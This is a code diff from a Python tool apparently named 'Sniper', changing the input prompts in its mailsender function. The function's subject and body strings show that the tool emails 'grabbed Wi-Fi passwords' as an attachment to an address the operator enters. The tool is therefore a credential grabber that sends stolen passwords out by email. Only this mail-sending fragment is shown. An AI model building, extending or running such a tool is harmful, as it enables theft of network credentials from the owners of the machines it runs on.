@@ -59,9 +59,9 @@ def mailsender():
     clear()
     subject = "Sniper- Grabbed Wi-Fi Passwords"
     body = "This is an email sent from Sniper. Find your grabbed Wi-Fi Passwords in the below attached file. Goodbye. "
-    sender_email = input("Enter Your E-Mail ID")
-    password = input("Enter Your Password")
-    receiver_email = input("Enter the E-mail ID of the Reciever")
+    sender_email = input("Enter Your E-Mail ID:\t\t")
+    password = input("Enter Your Password:\t\t")
+    receiver_email = input("Enter the Reciever E-mail ID:\t")
 
     print ('\n')
     print ('[ * * * * * * * * * * * * * * * * * * * * * * * * * ]')
